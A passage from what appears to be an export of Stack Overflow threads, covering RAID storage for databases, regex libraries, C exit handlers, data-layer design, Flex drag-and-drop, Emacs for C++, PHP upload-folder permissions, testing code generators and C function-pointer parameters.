 <p>Just to get this started, I am using a Dell MD3000 direct attached storage device, connected via redundant HBA cards.  It has 9x146Gb 15K drives, arranged in 4 RAID 1 arrays with 1 hot spare standing by.  Total data footprint is approaching 200Gb.  I'm not thrilled with the IO performance, but it's getting the job done.</p>
 <p>We have a database cluster attached to a NAS, also with redundant HBA.  The NAS units are RAID-10.  From our storage-meister, for databases the higher RPM the better.</p>
 <p>The biggest performance boost you can get is by partitioning tables/indexes onto different disks. The first step would be to put indexes on one disk and data on an other. After this you should consider which tables/indexes are used together, and put them on separate disks (""spindles"") when possible.</p>
 <p>Although SAS-based DAS is likely to be quickest for a single DB server (ideally with 15krpm 2.5 inch SFF disks in a RAID 10 configuration) for most systems you lose a lot of the advantages that a SAN can bring. For that reason I'd always build databases with dual FC (4 or 8Gbps fibre links) adapters into dual SAN switches, connected to a dual-controller SAN array. Not only will this scenario be very quick indeed but it will open up the options to utilise the various snapshot techniques that these boxes have to offer. These can enable'live-live' DB replication between sites for DR, instant database restoration and excellent capacity expansion/reduction with no impact on the server/s themselves. Hope this helps, let me know if I can add any more.</p>
 <p>Eric, perhaps you could look at some form of SAN in the near future - even the cheapest systems offer some form of snapshot system. In the scenario you mentioned this would have allow you to have restored to a previous snapshot of your data in moments. The HP MSA2000fc box is quite cheap and offers some of these services, as do many other manufacturers of course.</p>
 <p>That would depend on the use you are putting the drives to.  Some sample applications might be:</p>

<ul>
<li>Robust storage of a modest amount of data with modest traffic (such as a home network with various por^H^H^Hmedia files on it): One mirrored pair (RAID 1) of disks that are separate from the system disk of the machine they are installed in.  This will allow you to rebuild the machine or perform major surgery without affecting the data volume.  RAID-1 means that the data will survive the failure of a single disk.</li>
<li>A video editing sytem that needs fast streaming but not necessarily 100% reliability: a direct-attach RAID-0 (striped) on fibre channel disks with 'V' firmware (a seagate-ism but they make most such parts).  Fibre channel is a packet based protocol whereas with SCSI two devices book out the whole bus.  FC works better under load.</li>
<li>Trnsactional application: Logs on a mirrored pair and data on one or more RAID-5/6, RAID-10 or RAID-50/60 volumes.  On a SAN or any controller configuration with battery-backed write back caching the controller can optimise the disk writes.  DB logs are mostly sequential access whereas the data volumes are mostly random access.  The random seek activity will disturb the logging activity so you will get a performance gain from keeping the logging disks relatively quiet and free from competing traffic.</li>
<li>Large data warehouse fact table: A series of mirrored pairs (RAID 1) on JBODs with as many host channels into the server as you can afford.  Spread the fact table partitions across the mirrored pairs.  Striped disks with typical array firmware setup will often only get you one (say) 64k stripe per revolution of the disk, which comes to maybe 5 or 10MB/sec per disk on a 10K drive.  DW workloads have a more streaming data access pattern than a transactional application.  Using the mirrored pairs means that the disks can potentially stream data at something more like their maximum data transfer rate.  This can be an order of magnitude faster.  </li>
</ul>
"
"Pre-built regular expression patterns or Regex Libraries? <p>Does anyone use have a good regex library that they like to use? Most of the regexes that you find online either contain bugs or are so focused on the edge cases that it turns into a competition to validate whatever spec 100%. Of course you can write your own, but when you are billing by the hour its handy to have a library around. </p>
 <p>Besides being pretty much the best Regex tool on the market (seriously), RegexBuddy is about the only tool I know of that lets you switch amongst different Regex rendering engines.</p>

<p><a href=""http://www.regexbuddy.com/"" rel=""nofollow"">http://www.regexbuddy.com/</a></p>

<p>See info here:</p>

<p><a href=""http://en.wikipedia.org/wiki/RegexBuddy"" rel=""nofollow"">http://en.wikipedia.org/wiki/RegexBuddy</a></p>

<blockquote>
  <p>RegexBuddy's proprietary regular expression engine allows the software to emulate the rules and limitations of numerous popular regular expression flavors.</p>
</blockquote>
 <p>Boost, for c++</p>
 <p>Lately, I do all my text parsing in Perl.  If I needed regex's in another language, I'd go with <a href=""http://www.pcre.org/"" rel=""nofollow"">PCRE</a>.</p>

<blockquote>
  <p>The PCRE library is a set of functions that implement regular
     expression pattern matching using the same syntax and semantics as
     Perl&nbsp;5. PCRE has its own native API, as well as a set of
     wrapper functions that correspond to the POSIX regular expression
     API. The PCRE library is free, even for building commercial
     software.</p>
  
  <p>PCRE was originally written for the
     <a href=""http://www.exim.org/"" rel=""nofollow"">Exim MTA</a>,
     but is now used by many high-profile open source projects, including
     <a href=""http://httpd.apache.org/"" rel=""nofollow"">Apache</a>,
     <a href=""http://www.php.net/"" rel=""nofollow"">PHP</a>,
     <a href=""http://www.kde.org/"" rel=""nofollow"">KDE</a>,
     <a href=""http://www.postfix.org/"" rel=""nofollow"">Postfix</a>,
     <a href=""http://www.analog.cx/"" rel=""nofollow"">Analog</a>, and
     <a href=""http://nmap.org/"" rel=""nofollow"">Nmap</a>.
     PCRE has also found its way into some well known commercial products, like
     <a href=""http://www.apple.com/safari/"" rel=""nofollow"">Apple Safari</a>.
     Some other interesting projects using PCRE include
     <a href=""http://www.call-with-current-continuation.org/"" rel=""nofollow"">Chicken</a>,
     <a href=""http://www.ferite.org/"" rel=""nofollow"">Ferite</a>,
     <a href=""http://www.canonware.com/onyx/"" rel=""nofollow"">Onyx</a>,
     <a href=""http://www.hypermail.org/"" rel=""nofollow"">Hypermail</a>,
     <a href=""http://leafnode.sourceforge.net/"" rel=""nofollow"">Leafnode</a>,
     <a href=""http://www.askemos.org/"" rel=""nofollow"">Askemos</a>,
     and <a href=""http://www.wenlin.com/"" rel=""nofollow"">Wenlin</a>.</p>
</blockquote>

<p>PCRE is mature, and has the support of numerous projects.  Apache and Apple both have a vested interest in making it high-quality.  I doubt that any other RE library is likely to surpass it in both functionality and quality (or possibly either) anytime soon.</p>
 <p>You can search for regular expression in <a href=""http://regexlib.com/"" rel=""nofollow"">regexlib</a>.</p>
 <p>e-texteditor hilights what you're searching for as you type it. This is incredibly useful, as you can paste your 'sample text' into a file, and just type your regex into the search field, and see what it's matching right in front of you.</p>

<p>None of these 'visual regex builder' things are substitutes for actually LEARNING regular expressions.</p>
 <p>One nice source that provides commonly requested regular expressions is Perl's <a href=""https://metacpan.org/pod/Regexp::Common"" rel=""nofollow"">Regexp::Common</a>. </p>

<p>Currently provides patterns for the following (from the home page):</p>

<pre><code>Regexp::Common::balanced
Provides regexes for strings with balanced parenthesized delimiters.

Regexp::Common::comment
Provides regexes for comments of various languages (43 languages currently).

Regexp::Common::delimited
Provides regexes for delimited strings.

Regexp::Common::lingua
Provides regexes for palindromes.

Regexp::Common::list
Provides regexes for lists.

Regexp::Common::net
Provides regexes for IPv4 addresses and MAC addresses.

Regexp::Common::number
Provides regexes for numbers (integers and reals).

Regexp::Common::profanity
Provides regexes for profanity.

Regexp::Common::whitespace
Provides regexes for leading and trailing whitespace.

Regexp::Common::zip
Provides regexes for zip codes.
</code></pre>
"
"Is there a difference between the on_exit() and atexit() functions? <p>Is there any difference between</p>

<pre><code>   int on_exit(void (*function)(int , void *), void *arg);
</code></pre>

<p>and</p>

<pre><code>   int atexit(void (*function)(void));
</code></pre>

<p>other than the fact that the function used by on_exit gets the exit status?</p>

<p>That is, if I don't care about the exit status, is there any reason to use one or the other?</p>

<p><strong>Edit:</strong> Many of the answers warned against <code>on_exit</code> because it's non-standard. If I'm developing an app that is for internal corporate use and guaranteed to run on specific configurations, should I worry about this? </p>
 <p>You should use <code>atexit()</code> if possible.  <code>on_exit()</code> is nonstandard and less common.  For example, it's not available on OS X.</p>

<p>Kernel.org - <a href=""http://www.kernel.org/doc/man-pages/online/pages/man3/on_exit.3.html""><code>on_exit()</code></a>:</p>

<blockquote>
  <p>This function comes from SunOS 4, but is also present in libc4, libc5 and
  glibc.  It no longer occurs in Solaris (SunOS 5).  Avoid this function, and
  use the standard atexit(3) instead.</p>
</blockquote>
 <p>According to <a href=""http://www.delorie.com/gnu/docs/glibc/libc_560.html"">this link</a> I found, it seems there are a few differences.  <code>on_exit</code> will let you pass in an argument that is passed in to the <code>on_exit</code> function when it is called... which might let you set up some pointers to do some cleanup work on when it is time to exit.</p>

<p>Furthermore, it appears that <code>on_exit</code> was a SunOS specific function that may not be compatible on all platforms... so you may want to stick with atexit, despite it being more restrictive.</p>
 <p>@Nathan</p>

<p>First, see if there is another API call to determine exit status... a quick glance and I don't see one, but I am not well versed in the standard C API.</p>

<p>An easy alternative is to have a global variable that stores the exit status... the default being an unknown error cause (for if the program terminates abnormally).  Then, when you call exit, you can store the exit status in the global and retrieve it from any atexit functions.  This requires storing the exit status diligently before every exit call, and clearly is not ideal, but if there is no API and you don't want to risk <code>on_exit</code> not being on the platform... it might be the only option.</p>
 <p>@Nathan, I can't find any function that will return the exit code for the current running process.  I expect that it isn't set yet at the point when <code>atexit()</code> is called, anyway.  By this I mean that the runtime knows what it is, but probably hasn't reported it to the OS.  This is pretty much just conjecture, though.</p>

<p>It looks like you will either need to use <code>on_exit()</code> or structure your program so that the exit code doesn't matter.  It would not be unreasonable to have the last statement in your main function flip a global <code>exited_cleanly</code> variable to true.  In the function you register with <code>atexit()</code>, you could check this variable to determine how the program exited.  This will only give you two states, but I expect that would be sufficient for most needs.  You could also expand this type of scheme to support more exit states if necessary.</p>
 <p>The difference is that <code>atexit</code> is C and <code>on_exit</code> is some weird extension available on GNU and who-knows-what-other Unixy systems (but <strong>NOT</strong> part of POSIX).</p>
"
"Data Layer Best Practices <p>I am in the middle of a ""discussion"" with a colleague about the best way to implement the data layer in a new application.</p>

<p>One viewpoint is that the data layer should be aware of business objects (our own classes that represent an entity), and be able to work with that object natively.  </p>

<p>The opposing viewpoint is that the data layer should be object-agnostic, and purely handle simple data types (strings, bools, dates, etc.)</p>

<p>I can see that both approaches may be valid, but my own viewpoint is that I prefer the former.  That way, if the data storage medium changes, the business layer doesn't (necessarily) have to change to accommodate the new data layer.  It would therefore be a trivial thing to change from a SQL data store to a serialized xml filesystem store.</p>

<p>My colleague's point of view is that the data layer shouldn't have to know about object definitions, and that as long as the data is passed about appropriately, that is enough.  </p>

<p>Now, I know that this is one of those questions that has the potential to start a religious war, but I'd appreciate any feedback from the community on how you approach such things.  </p>

<p>TIA</p>
 <p>An excellent book I have, which covers this topic, is <a href=""http://rads.stackoverflow.com/amzn/click/0131401572"" rel=""nofollow"">Data Access Patterns</a>, by Clifton Nock.  It has got many good explanations and good ideas on how to decouple your business layer from the persistence layer.  You really should give it a try.  It's one of my favorite books.</p>
 <p>One trick I've found handy is to have my data layer be ""collection agnostic"". That is, whenever I want to return a list of objects from my data layer, I get the caller to pass in the list. So instead of this:</p>

<pre><code>public IList&lt;Foo&gt; GetFoosById(int id) { ... }
</code></pre>

<p>I do this:</p>

<pre><code>public void GetFoosById(IList&lt;Foo&gt; foos, int id) { ... }
</code></pre>

<p>This lets me pass in a plain old List if that's all I need, or a more intelligent implementation of IList&lt;T&gt; (like ObservableCollection&lt;T&gt;) if I plan to bind to it from the UI. This technique also lets me return stuff from the method like a ValidationResult containing an error message if one occurred.</p>

<p>This still means that my data layer knows about my object definitions, but it gives me one extra degree of flexibility.</p>
 <p>Check out Linq to SQL, if I were creating a new application right now I would consider relying on an entirely Linq based data layer.</p>

<p>Other than that I think it's good practise to de-couple data and logic as much as possible, but that isn't always practical.  A pure separation between logic and data access makes joins and optimisations difficult, which is what makes Linq so powerful.</p>
 <p>You can have both. Let data layer not know of your bussiness objects and make it capable of working with more than one type of data sources. If you supply a common interface (or an abstract class) for interacting with data, you can have different implementations for each type of data source. Factory pattern goes well here.</p>
 <p>Jeffrey Palermo wrote a good post about this. He called it <a href=""http://jeffreypalermo.com/blog/the-onion-architecture-part-1/"" rel=""nofollow"">Onion Architecture</a>.</p>
 <p>In applications wherein we use NHibernate, the answer becomes ""somewhere in between"", in that, while the XML mapping definitions (they specify which table belongs to which object and which columns belong to which field, etc) are clearly in the business object tier. </p>

<p>They are passed to a generic data session manager which is not aware of any of the business objects; the only requirement is that the business objects passed to it for CRUD have to have a mapping file.</p>
 <p>It really depends on your view of the world - I used to be in the uncoupled camp. The DAL was only there to supply data to the BAL - end of story.</p>

<p>With emerging technologies such as Linq to SQL and Entity Framework becoming a bit more popular, then the line between DAL and BAL have been blurred a bit. In L2S especially your DAL is quite tightly coupled to the Business objects as the object model has a 1-1 mapping to your database field.</p>

<p>Like anything in software development there is no right or wrong answer. You need to understand your requirements and future requirments and work from there. I would no more use a Ferrari on the Dakhar rally as I would a Range Rover on a track day.</p>
 <p>Old post but searching for similar information I came across <a href=""http://www.simple-talk.com/dotnet/.net-framework/.net-application-architecture-the-data-access-layer/"" rel=""nofollow"">this</a> which explains it nicely. </p>
"
"How can I ""unaccept"" a drag in Flex? <p>Once I've called <code>DragManager.acceptDrag</code> is there any way to ""unaccept"" the drag? Say that I have a view which can accept drag and drop, but only in certain areas. Once the user drags over one of these areas I call <code>DragManager.acceptDrag(this)</code> (from a <code>DragEvent.DRAG_OVER</code> handler), but if the user then moves out of this area I'd like to change the status of the drag to not accepted and show the <code>DragManager.NONE</code> feedback. However, neither calling <code>DragManager.acceptDrag(null)</code> nor <code>DragManager.showFeedback(DragManager.NONE)</code> seems to have any effect. Once I've accepted the drag an set the feedback type I can't seem to change it.</p>

<p>Just to make it clear: the areas where the user should be able to drop are not components or even display objects, in fact they are just ranges in the text of a text field (like the selection). Had they been components of their own I could have solved it by making each of them accept drag events individually. I guess I could create proxy components that float over the text to emulate it, but I'd rather not if it isn't necessary.</p>

<hr>

<p>I've managed to get it working in both AIR and the browser now, but only by putting proxy components on top of the ranges of text where you should be able to drop things. That way I get the right feedback and drops are automatically unaccepted on drag exit.</p>

<p>This is the oddest thing about D&amp;D in AIR:</p>

<pre><code>DragManager.doDrag(initiator, source, event, dragImage, offsetX, offsetY);
</code></pre>

<p>In browser-based Flex, <code>offsetX</code> and <code>offsetY</code> should be negative (so says the documentation, and it works fine). However, when running <em>exactly the same code</em> in AIR you have to make the offsets positive. The same numbers, but positive. That is very, very weird.</p>

<hr>

<p>I've tested some more and what <a href=""http://stackoverflow.com/questions/10870/how-can-i-unaccept-a-drag-in-flex#11209"">@maclema</a> works, but not if you run in AIR. It seems like drag and drop in AIR is different. It's really, really weird because not only is the feedback not showing correctly, and it's not possible to unaccept, but the coordinates are also completely off. I just tried my application in a browser instead of AIR and dragging and dropping is completely broken.</p>

<p>Also, skipping the <code>dragEnter</code> handler works fine in AIR, but breaks everything when running in a browser.</p>
 <p>Are you using only the dragEnter method? If you are trying to reject the drag while still dragging over the same component you need to use both the dragEnter and dragOver methods.</p>

<p>Check out this example:</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;
&lt;mx:Application xmlns:mx=""http://www.adobe.com/2006/mxml"" layout=""absolute""&gt;
    &lt;mx:Script&gt;
    	&lt;![CDATA[
    		import mx.core.DragSource;
    		import mx.managers.DragManager;
    		import mx.events.DragEvent;

    		private function onDragEnter(e:DragEvent):void {
    			if ( e.target == lbl ) {

    				if ( e.localX &lt; lbl.width/2 ) {
    					trace(""accept"");
    					DragManager.acceptDragDrop(this);
    				}
    				else {
    					DragManager.acceptDragDrop(null);
    				}
    			}
    		}

    		private function doStartDrag(e:MouseEvent):void {
    			if ( e.buttonDown ) {
    				var ds:DragSource = new DragSource();
    				ds.addData(""test"", ""text"");

    				DragManager.doDrag(btn, ds, e);
    			}
    		}
    	]]&gt;
    &lt;/mx:Script&gt;
    &lt;mx:Label id=""lbl"" text=""hello world!"" left=""10"" top=""10"" dragEnter=""onDragEnter(event)"" dragOver=""onDragEnter(event)"" /&gt;
    &lt;mx:Button id=""btn"" x=""47"" y=""255"" label=""Button"" mouseMove=""doStartDrag(event)""/&gt;
&lt;/mx:Application&gt;
</code></pre>
 <p>ok, I see the problem now. Rather than null, try setting it to the dragInitiator.</p>

<p>Check this out.</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;
&lt;mx:WindowedApplication xmlns:mx=""http://www.adobe.com/2006/mxml"" layout=""absolute""&gt;
    &lt;mx:Script&gt;
    	&lt;![CDATA[
    		import mx.controls.Alert;
    		import mx.events.DragEvent;
    		import mx.managers.DragManager;
    		import mx.core.DragSource;

    		private function doStartDrag(e:MouseEvent):void {
    			if ( e.buttonDown &amp;&amp; !DragManager.isDragging ) {
    			var ds:DragSource = new DragSource();
    			ds.addData(""test"", ""test"");

    			DragManager.doDrag(btn, ds, e);
    			}
    		}

    		private function handleDragOver(e:DragEvent):void {
    			if ( e.localX &lt; cvs.width/2 ) {
    				//since null does nothing, lets just set to accept the drag
    				//operation, but accept it to the dragInitiator
    				DragManager.acceptDragDrop(e.dragInitiator);
    			}	
    			else {
    				//accept drag
    				DragManager.acceptDragDrop(cvs);
    				DragManager.showFeedback( DragManager.COPY );
    			}
    		}

    		private function handleDragDrop(e:DragEvent):void {
    			if ( e.dragSource.hasFormat(""test"") ) {
    				Alert.show(""Got a drag drop!"");
    			}
    		}
    	]]&gt;
    &lt;/mx:Script&gt;
    &lt;mx:Canvas x=""265"" y=""66"" width=""321"" height=""245"" backgroundColor=""#FF0000"" id=""cvs"" dragOver=""handleDragOver(event)"" dragDrop=""handleDragDrop(event)""&gt;
    &lt;/mx:Canvas&gt;
    &lt;mx:Button id=""btn"" x=""82"" y=""140"" label=""Drag Me"" mouseDown=""doStartDrag(event)""/&gt;
&lt;/mx:WindowedApplication&gt;
</code></pre>
 <p>Yes, drag and drop is different in AIR. I HATE that! It takes a lot of playing around to figure out how to get things to work the same as custom dnd that was built in flex.</p>

<p>As for the coordinates, maybe play around with localToContent, and localToGlobal methods. They may help in translating the coordinates to something useful.</p>

<p>Good luck. I will let you know if I think of anything else.</p>
 <p>If you don't need native drag and drop in AIR, you can get the Flex drag and drop behavior by subclassing WindowedApplication and setting the DragManager. See this post on the Adobe Jira for more info: <a href=""https://bugs.adobe.com/jira/browse/SDK-13983"" rel=""nofollow"">https://bugs.adobe.com/jira/browse/SDK-13983</a></p>
 <p>You are misunderstanding the concept. Your ""unaccept"" is achieved by implementing the dragOverHandler and signaling that the data is not wanted.</p>

<p>Here is the basic concept:</p>

<ol>
<li><p>register the dragEnterHandler or override the already registered method.</p>

<pre><code>function dragEnterHandler(event: DragEvent):void {
    if (data suites at least one location in this component)
        DragManager.acceptDragDrop(this);
}
</code></pre>

<p>This enables your container to receive further messages (dragOver/dragExit). But this is <strong>NOT</strong> the location to decide which kind of mouse cursor should be displayed.</p>

<p>Without <strong>DragManager.acceptDragDrop(this);</strong> the other handlers aren't called.</p></li>
<li><p>register the dragOverHandler or override the already registered method.</p>

<pre><code>function dragOverHandler(event: DragEvent):void {
    if (data suites at least no location in this component) {
        DragManager.showFeedback(DragManager.NONE);
        return;
    }

    ... // handle other cases and show the cursor / icon you want
}
</code></pre>

<p>Calling <strong>DragManager.showFeedback(DragManager.NONE);</strong> does the trick to display the ""unaccept"".</p></li>
<li><p>register the dragExitHandler or override the already registered method.</p>

<pre><code>function dragOverHandler(event: DragEvent):void {
    // handle the recieved data as you like.
}
</code></pre></li>
</ol>
"
"Any good advice on using emacs for C++ project? <p>I'm looking for a good article on using emacs as C/C++ IDE.</p>

<p>Something like Steve Yegge's <a href=""http://steve.yegge.googlepages.com/effective-emacs"">""Effective emacs""</a>.</p>
 <p>No specific article, really, but I've found <a href=""http://www.emacswiki.org/cgi-bin/wiki"">EmacsWiki</a> to be full of useful information. Consider checking out these entries:</p>

<ul>
<li><a href=""http://www.emacswiki.org/cgi-bin/wiki/CPlusPlus"">CPlusPlus</a> as a starting point for many C++-related articles, and</li>
<li><a href=""http://www.emacswiki.org/cgi-bin/wiki/CppTemplate"">CppTemplate</a> to define a template that can give you a good skeleton when you start new files</li>
</ul>
 <p>I've recently stumbled upon this <a href=""http://www.physics.ucsb.edu/~taro/comp/tips/emacs/emacs-c-dev.html"" rel=""nofollow"">article</a> which is quite good.</p>

<p>EDIT: Yep the link is no longer valid. It seems like they've changed their url recently and it doesn't redirect properly. Hopefully it will be back soon. Anyway the article was called ""Benjamin Rutt's Emacs C development tips"". I managed to find a copy <a href=""http://xugx2007.blogspot.com/2007/06/benjamin-rutts-emacs-c-development-tips.html"" rel=""nofollow"">here</a>.</p>
 <p>I'm planning to write such article in near future, but you can now take <a href=""http://xtalk.msk.su/~ott/common/emacs/rc/emacs-rc-cedet.el.html"">my configuration</a> of <a href=""http://cedet.sf.net"">Cedet</a> + Emacs, that helps me to effectively edit C++ sources.
If you'll have questions, you could ask me directly</p>
 <p>Be aware that Emacs' C++ mode is based on only regular expressions, not a grammar.  Hence, the syntax highlighting is not based strictly on the syntax of the language itself, but rather is largely based on commonplace formatting.  The Emacs syntax highlighting of C++ often makes mistakes.</p>

<p>The problem is not limited to syntax hightlighting.  The same defective design applies to the automatic formatting.  All this said, I have been using only Emacs for all of my editing of C++ source code for over 20 years, since the cfront days.  (I usually turn off electric key bindings, because of Emacs' defective regex-based design.  Regexes do not have enough expressive power to describe the C++ syntax accurately.</p>
 <p>I recommend <a href=""https://github.com/leoliu/ggtags"" rel=""nofollow"">ggtags</a> and <a href=""https://github.com/Sarcasm/irony-mode"" rel=""nofollow"">irony-mode</a>. Other then that you may want to use <a href=""https://github.com/syohex/emacs-helm-ag"" rel=""nofollow"">helm-ag</a> to search (""grep"") for strings in your codebase.</p>
"
"What are the proper permissions for an upload folder with PHP/Apache? <p>Sorry for the basic question - I'm a .NET developer and don't have much experience with LAMP setups.</p>

<p>I have a PHP site that will allow uploads to a specific folder. I have been told that this folder needs to be owned by the webserver user for the upload process to work, so I created the folder and then set permissions as such:</p>

<pre><code>chown apache:apache -R uploads/
chmod 755 -R uploads/
</code></pre>

<p>The only problem now is that the FTP user can not modify the uploaded files at all.</p>

<p>Is there a permission setting that will allow me to still upload files and then modify them later as a user other than the webserver user?</p>
 <p>Or at least 766.</p>

<ul>
<li>read = 4</li>
<li>write = 2</li>
<li>execute = 1</li>
</ul>

<p>7 = read + write + execute</p>

<p>6 = read + write</p>

<ul>
<li>first number: owner</li>
<li>second number: group</li>
<li>third number: other users</li>
</ul>
 <p>You can create a new group with both the apache user and FTP user as members and then make the permission on the upload folder 775.  This should give both the apache and FTP users the ability to write to the files in the folder but keep everyone else from modifying them.</p>
 <p>I will add that if you are using SELinux that you need to make sure the type context is tmp_t  You can accomplish this by using the chcon utility</p>

<blockquote>
  <p>chcon -t tmp_t uploads</p>
</blockquote>
 <p>I would go with Ryan's answer if you really want to do this.</p>

<p>In general on a *nix environment, you always want to err on giving away as little permissions as possible.</p>

<p>9 times out of 10, 755 is the ideal permission for this - as the only user with the ability to modify the files will be the webserver. Change this to 775 with your ftp user in a group if you REALLY need to change this.</p>

<p>Since you're new to php by your own admission, here's a helpful link for improving the security of your upload service:
<a href=""http://www.php.net/move_uploaded_file"" rel=""nofollow""><code>move_uploaded_file</code></a></p>
 <p>What is important is that the <code>apache</code> user and group should have minimum <code>read</code> access and in some cases <code>execute</code> access. For the rest you can give <code>0</code> access.</p>

<p>This is the most safe setting.</p>
 <p>Remember also <code>CHOWN</code> or <code>chgrp</code> your website folder. Try  <code>myusername# chown -R myusername:_www uploads</code></p>
 <p>I would support the idea of creating a ftp group that will have the rights to upload. However, i don't think it is necessary to give 775 permission. 7 stands for read, write, execute. Normally you want to allow certain groups to read and write, but depending on the case, execute may not be necessary. </p>
"
"How should I unit test a code-generator? <p>This is a difficult and open-ended question I know, but I thought I'd throw it to the floor and see if anyone had any interesting suggestions.</p>

<p>I have developed a code-generator that takes our python interface to our C++ code (generated via SWIG) and generates code needed to expose this as WebServices.  When I developed this code I did it using TDD, but I've found my tests to be brittle as hell.  Because each test essentially wanted to verify that for a given bit of input code (which happens to be a C++ header) I'd get a given bit of outputted code I wrote a small engine that reads test definitions from XML input files and generates test cases from these expectations.</p>

<p>The problem is I dread going in to modify the code at all.  That and the fact that the unit tests themselves are a: complex, and b: brittle.</p>

<p>So I'm trying to think of alternative approaches to this problem, and it strikes me I'm perhaps tackling it the wrong way.  Maybe I need to focus more on the outcome, IE: does the code I generate actually run and do what I want it to, rather than, does the code look the way I want it to.</p>

<p>Has anyone got any experiences of something similar to this they would care to share?</p>
 <p>I started writing up a summary of my experience with my own code generator, then went back and re-read your question and found you had already touched upon the same issues yourself, focus on the execution results instead of the code layout/look.</p>

<p>Problem is, this is hard to test, the generated code might not be suited to actually run in the environment of the unit test system, and how do you encode the expected results?</p>

<p>I've found that you need to break down the code generator into smaller pieces and unit test those. Unit testing a full code generator is more like integration testing than unit testing if you ask me.</p>
 <p>Yes, results are the ONLY thing that matters. The real chore is writing a framework that allows your generated code to run independently... spend your time there.</p>
 <p>If you are running on *nux you might consider dumping the unittest framework in favor of a bash script or makefile. on windows you might consider building a shell app/function that runs the generator and then uses the code (as another process) and unittest that.</p>

<p>A third option would be to generate the code and then build an app from it that includes nothing but a unittest. Again you would need a shell script or whatnot to run this for each input. As to how to encode the expected behavior, it occurs to me that it could be done in much the same way as you would for the C++ code just using the generated interface rather than the C++ one.</p>
 <p>Recall that ""unit testing"" is only one kind of testing.  You should be able to unit test the <strong>internal</strong> pieces of your code generator.  What you're really looking at here is system level testing (a.k.a. regression testing).  It's not just semantics... there are different mindsets, approaches, expectations, etc.  It's certainly more work, but you probably need to bite the bullet and set up an end-to-end regression test suite: fixed C++ files -> SWIG interfaces -> python modules -> known output.  You really want to check the known input (fixed C++ code) against expected output (what comes out of the final Python program).  Checking the code generator results directly would be like diffing object files...</p>
 <p>Just wanted to point out that you can still achieve fine-grained testing while verifying the results: you can test individual chunks of code by nesting them inside some setup and verification code:</p>

<pre><code>int x = 0;
GENERATED_CODE
assert(x == 100);
</code></pre>

<p>Provided you have your generated code assembled from smaller chunks, and the chunks do not change frequently, you can exercise more conditions and test a little better, and hopefully avoid having all your tests break when you change specifics of one chunk.</p>
 <p>Unit testing is just that testing a specific unit. So if you are writing a specification for class A, it is ideal if class A does not have the real concrete versions of class B and C.</p>

<p>Ok I noticed afterwards the tag for this question includes C++ / Python, but the principles are the same:</p>

<pre><code>    public class A : InterfaceA 
    {   
      InterfaceB b;

      InterfaceC c;

      public A(InterfaceB b, InterfaceC c)   {
          this._b = b;
          this._c = c;   }

      public string SomeOperation(string input)   
      {
          return this._b.SomeOtherOperation(input) 
               + this._c.EvenAnotherOperation(input); 
      } 
    }
</code></pre>

<p>Because the above System A injects interfaces to systems B and C, you can unit test just system A, without having real functionality being executed by any other system. This is unit testing.</p>

<p>Here is a clever manner for approaching a System from creation to completion, with a different When specification for each piece of behaviour:</p>

<pre><code>public class When_system_A_has_some_operation_called_with_valid_input : SystemASpecification
{
    private string _actualString;

    private string _expectedString;

    private string _input;

    private string _returnB;

    private string _returnC;

    [It]
    public void Should_return_the_expected_string()
    {
        _actualString.Should().Be.EqualTo(this._expectedString);
    }

    public override void GivenThat()
    {
        var randomGenerator = new RandomGenerator();
        this._input = randomGenerator.Generate&lt;string&gt;();
        this._returnB = randomGenerator.Generate&lt;string&gt;();
        this._returnC = randomGenerator.Generate&lt;string&gt;();

        Dep&lt;InterfaceB&gt;().Stub(b =&gt; b.SomeOtherOperation(_input))
                         .Return(this._returnB);
        Dep&lt;InterfaceC&gt;().Stub(c =&gt; c.EvenAnotherOperation(_input))
                         .Return(this._returnC);

        this._expectedString = this._returnB + this._returnC;
    }

    public override void WhenIRun()
    {
        this._actualString = Sut.SomeOperation(this._input);
    }
}
</code></pre>

<p>So in conclusion, a single unit / specification can have multiple behaviours, and the specification grows as you develop the unit / system; and if your system under test depends on other concrete systems within it, watch out.</p>
 <p>My recommendation would be to figure out a set of known input-output results, such as some simpler cases that you already have in place, and <em>unit test the code that is produced</em>. It's entirely possible that as you change the generator that the exact string that is produced may be slightly different... but what you really care is whether it is interpreted in the same way. Thus, if you test the results as you would test that code if it were your feature, you will find out if it succeeds in the ways you want.</p>

<p>Basically, what you really want to know is whether your generator will produce what you expect without physically testing every possible combination (also: impossible). By ensuring that your generator is consistent in the ways you expect, you can feel better that the generator will succeed in ever-more-complex situations.</p>

<p>In this way, you can also build up a suite of regression tests (unit tests that need to keep working correctly). This will help you make sure that changes to your generator aren't breaking other forms of code. When you encounter a bug that your unit tests didn't catch, you may want to include it to prevent similar breakage.</p>
 <p>I find that you need to test what you're generating more than how you generate it.</p>

<p>In my case, the program generates many types of code (C#, HTML, SCSS, JS, etc.) that compile into a web application. The best way I've found to reduce regression bugs overall is to test the web application itself, not by testing the generator.  </p>

<p>Don't get me wrong, there are still unit tests checking out some of the generator code, but our biggest bang for our buck has been UI tests on the generated app itself.</p>

<p>Since we're generating it we also generate a nice abstraction in JS we can use to programatically test the app. We followed some ideas outlined here: <a href=""http://code.tutsplus.com/articles/maintainable-automated-ui-tests--net-35089"" rel=""nofollow"">http://code.tutsplus.com/articles/maintainable-automated-ui-tests--net-35089</a></p>

<p>The great part is that it really tests your system end-to-end, from code generation out to what you're actually generating.  Once a test fails, its easy to track it back to where the generator broke.</p>

<p>It's pretty sweet.</p>

<p>Good luck!</p>
"
"Passing more parameters in C function pointers <p>Let's say I'm creating a chess program. I have a function</p>

<pre><code>void foreachMove( void (*action)(chess_move*), chess_game* game);
</code></pre>

<p>which will call the function pointer action on each valid move. This is all well and good, but what if I need to pass more parameters to the action function? For example:</p>

<pre><code>chess_move getNextMove(chess_game* game, int depth){
  //for each valid move, determine how good the move is
  foreachMove(moveHandler, game);
}

void moveHandler(chess_move* move){
  //uh oh, now I need the variables ""game"" and ""depth"" from the above function
}
</code></pre>

<p>Redefining the function pointer is not the optimal solution. The foreachMove function is versatile and many different places in the code reference it. It doesn't make sense for each one of those references to have to update their function to include parameters that they don't need.</p>

<p>How can I pass extra parameters to a function that I'm calling through a pointer?</p>
 <p>You'd probably need to redefine the function pointer to take additional arguments.</p>

<pre><code>void foreachMove( void (*action)(chess_move*, int), chess_game* game )
</code></pre>
 <p>Ah, if only C supported closures...</p>

<p>Antonio is right; if you need to pass extra parameters, you'll need to redefine your function pointer to accept the additional arguments. If you don't know exactly what parameters you'll need, then you have at least three choices:</p>

<ol>
